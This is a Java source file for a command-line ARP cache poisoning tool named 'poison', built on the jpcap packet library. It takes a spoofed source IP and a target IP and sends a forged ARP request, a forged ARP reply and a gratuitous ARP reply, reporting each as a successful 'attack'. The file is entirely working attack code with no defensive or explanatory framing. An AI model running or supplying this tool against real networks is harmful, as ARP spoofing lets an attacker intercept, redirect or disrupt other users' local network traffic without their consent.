import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Properties;

import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;


public class poison {
	static byte[] broadcast=new byte[]{(byte)255,(byte)255,(byte)255,(byte)255,(byte)255,(byte)255};
	static int index=0;// Intiail value
	public static void main(String[] args) {
		// Parse Arguments
		Properties properties = new Properties();
		for (String arg : args) {
			if (arg.startsWith("-")) {
				int equalIndex = arg.indexOf('=');
				String propertyName = arg.substring(1, equalIndex);
				String propertyValue = arg.substring(equalIndex + 1);
				properties.setProperty(propertyName, propertyValue);
			}
		}
		if((String) properties.get("ipsrc")==null || (String) properties.get("ipdst")==null) // Check for mandatory arguments
		{
			System.out.println("Error using poison.\n You should at least specify the spoofed IP source and the IP destination.");
			System.out.println(" For example: java poison -ipsrc=<spoofed IP source> -ipdst=<destination IP>");
			System.out.println(" You can add other optional parameters such as: ");
			System.out.println("\t -hardsrc \t Specify the 12 hexadecimal digit MAC address of the source in this format: 000102030405.\n \t\t\t The default value is the interface's MAC.");
			System.out.println("\t -harddst \t Specify the 12 hexadecimal digit MAC address of the destination in this format: 000102030405.\n\t\t\t The default value is broadcast");
			System.out.println("\t -intf \t\t use -intf=0 for eth0 and -intf=1 for wlan0. The default value is eth0");
			return;
		}
		byte[] ipdst =null,ipsrc=null,hardsrc=null,harddst=null;
		try {
			ipsrc=InetAddress.getByName((String) properties.get("ipsrc")).getAddress();
			ipdst=InetAddress.getByName((String) properties.get("ipdst")).getAddress();
			String intf=(String) properties.get("intf");
			if(intf!=null)
				index=Integer.parseInt(intf.trim());// 0 for eth0 and 1 for wlan0
			String src=(String) properties.get("hardsrc");
			hardsrc=hexStringToByteArray(src);
			String dst=(String) properties.get("harddst");
			harddst=hexStringToByteArray(dst);
		}catch (UnknownHostException e) {
			e.printStackTrace();
		}
		System.out.println("The input was: ipsrc "+properties.get("ipsrc")+ " hardsrc "+properties.get("hardsrc")+" ipdst "+properties.get("ipdst")+" harddst "+properties.get("harddst") + " intf " + index);
		// Send 3 attacks
		int status = SendARPRequest(ipsrc, hardsrc, ipdst); //send ARP request
		if ( status == 1 )
			System.out.println("ARP Request Attack was successful");
		int status2 = SendARPReply(ipsrc, hardsrc, ipdst,harddst); //send ARP reply
		if ( status2 == 1 )
			System.out.println("ARP Reply Attack was successful");
		int status3 = SendARPReply(ipsrc, hardsrc, ipsrc,broadcast); //send gratuitios ARP reply
		if ( status3 == 1 )
			System.out.println("ARP Gratuitios Reply Attack was successful");
	}
	public static byte[] hexStringToByteArray(String s) {
		if(s!=null)
		{
			int len = s.length();
			byte[] data = new byte[len / 2];
			for (int i = 0; i < len; i += 2) {
				data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4)
						+ Character.digit(s.charAt(i+1), 16));
			}
			return data;
		}
		else
			return null;
	}
	public static int SendARPRequest(byte [] srcIP,byte [] srchard,byte [] destIP){
		try {
			NetworkInterface[] devices = JpcapCaptor.getDeviceList();
			if(srchard==null)
				srchard=devices[index].mac_address;
			JpcapSender sender = JpcapSender.openDevice(devices[index]);
			ARPPacket arp=new ARPPacket();
			arp.hardtype=ARPPacket.HARDTYPE_ETHER;
			arp.prototype=ARPPacket.PROTOTYPE_IP;
			arp.operation=ARPPacket.ARP_REQUEST;
			arp.hlen=6;
			arp.plen=4;
			arp.sender_hardaddr=srchard;
			arp.sender_protoaddr=srcIP;
			arp.target_hardaddr=new byte[]{(byte)0,(byte)0,(byte)0,(byte)0,(byte)0,(byte)0};
			arp.target_protoaddr=destIP;
			EthernetPacket ether=new EthernetPacket();
			ether.frametype=EthernetPacket.ETHERTYPE_ARP;
			ether.src_mac=srchard;
			ether.dst_mac=broadcast;
			arp.datalink=ether;
			//send the packet p
			sender.sendPacket(arp);
			sender.close();
			return 1;
		} catch (Exception e) {
			e.printStackTrace();
			return 0;
		}
	}
	public static int SendARPReply(byte [] srcIP,byte [] srchard,byte [] destIP,byte [] desthard){
		try {
			NetworkInterface[] devices = JpcapCaptor.getDeviceList();
			if(srchard==null)
				srchard=devices[index].mac_address;
			if(desthard==null)
				desthard=broadcast;
			JpcapSender sender = JpcapSender.openDevice(devices[index]);
			ARPPacket arp=new ARPPacket();
			arp.hardtype=ARPPacket.HARDTYPE_ETHER;
			arp.prototype=ARPPacket.PROTOTYPE_IP;
			arp.operation=ARPPacket.ARP_REPLY;
			arp.hlen=6;
			arp.plen=4;
			arp.sender_hardaddr=srchard;
			arp.sender_protoaddr=srcIP;
			arp.target_hardaddr=desthard;
			arp.target_protoaddr=destIP;

			EthernetPacket ether=new EthernetPacket();
			ether.frametype=EthernetPacket.ETHERTYPE_ARP;
			ether.src_mac=srchard;
			ether.dst_mac=broadcast;
			arp.datalink=ether;
			//send the packet arp
			sender.sendPacket(arp);
			sender.close();
			return 1;
		} catch (Exception e) {
			e.printStackTrace();
			return 0;
		}
	}
}
